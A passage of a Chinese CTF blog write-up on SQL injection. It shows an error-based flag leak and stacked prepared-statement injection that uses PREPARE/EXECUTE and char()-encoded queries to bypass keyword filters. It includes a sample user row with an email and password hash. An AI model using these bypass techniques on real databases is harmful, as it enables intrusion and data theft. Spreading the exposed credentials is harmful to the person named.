+XPATH syntax error: &apos;~flag{err0r_b4sed_sqli_+_hpf}~&apos;</code></pre><p>如果flag超过32位，可以mid截断来查询。不过本题中是禁止了mid函数的不过也不超过32位可以直接获取flag。</p>
+<h1 id="堆叠预编译注入"><a href="#堆叠预编译注入" class="headerlink" title="堆叠预编译注入"></a>堆叠预编译注入</h1><p>首先了解下预处理语句</p>
+<pre><code>预制语句的SQL语法基于三个SQL语句：
+
+PREPARE stmt_name FROM preparable_stmt;
+
+EXECUTE stmt_name [USING @var_name [, @var_name] ...];
+
+{DEALLOCATE | DROP} PREPARE stmt_name;</code></pre><p>对于不确定参数以问号代替，然后using加入参数即可。</p>
+<p><img src="http://47.106.185.69/1/./img/1559185099.jpg" alt></p>
+<p>预处理语句可以和正常查询一样，但是查询方式稍有变化，在一些绕过中可以利用这种机制来进行sql注入。</p>
+<p>堆叠注入</p>
+<p>在一条sql语句执行完毕后，使用分号结尾，然后利用多条语句执行特性，然后完整攻击。</p>
+<p>简单的堆叠查询。</p>
+<p><img src="http://47.106.185.69/1/./img/1559186303.jpg" alt></p>
+<pre><code>mysql&gt; set @a=&apos;select * from user where id =1&apos;;prepare stmt from @a;execute stmt;
+Query OK, 0 rows affected (0.00 sec)
+
+Query OK, 0 rows affected (0.00 sec)
+Statement prepared
+
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+| ID | username         | email            | password                         | img                                                                             |
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+|  1 | 275640346@qq.com | 275640346@qq.com | 20905fe3160505df06abf12bfc8294fa | ../upload/54223df3e0247c41ce29176d227f95cf/ae566253288191ce5d879e51dae1d8c3.png |
++----+------------------+------------------+----------------------------------+---------------------------------------------------------------------------------+
+1 row in set (0.00 sec)</code></pre><p>利用mysql的特性对十六进制也可进行查询。</p>
+<p><img src="http://47.106.185.69/1/./img/1559186526.jpg" alt></p>
+<p>如果对prepare excute等关键词无过滤便可以用这个特性绕过很多关键词来达到sql注入效果。</p>
+<p>或者ascii来解码进行注入</p>
+<p>mysql&gt; set @s=concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)); prepare a from @s;execute a;<br>Query OK, 0 rows affected (0.00 sec)</p>
+<p>Query OK, 0 rows affected (0.00 sec)<br>Statement prepared</p>
+<pre><code>+------------+
+| database() |
++------------+
+| qwb        |
++------------+
+1 row in set (0.00 sec)
+
+mysql&gt; select concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41));
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| concat(char(115),char(101),char(108),char(101),char(99),char(116),char(32),char(100),char(97),char(116),char(97),char(98),char(97),char(115),char(101),char(40),char(41)) |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| select database()                                                                                                                                                         |
++---------------------------------------------------------------------------------------------------------------------------------------------------------------------------+</code></pre><p>1 row in set (0.00 sec)</p>
+<p>参考强网杯web-随便注</p>
+<pre><code>https://k-ring.github.io/2019/05/28/%E7%AC%AC%E4%B8%89%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwriteup/</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/12/03/sql注入/" data-id="ck0l0oh9k0014py2iafig5o5b" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/3/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web漏洞/">web漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂/">杂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/渗透攻防/">渗透攻防</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/python/" style="font-size: 14px;">python</a> <a href="/tags/web漏洞/" style="font-size: 18px;">web漏洞</a> <a href="/tags/杂/" style="font-size: 16px;">杂</a> <a href="/tags/渗透攻防/" style="font-size: 12px;">渗透攻防</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/05/">May 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">February 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/11/">November 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/10/">October 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">September 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/06/25/csp内容安全策略/">csp内容安全策略</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/25/thinkphp3.2.3/">thinkphp框架学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/05/17/url跳转实战/">渗透之url跳转</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/20/反序列化学习/">PHP反序列化学习</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/14/2019DDCTF/">2019DDCTF</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
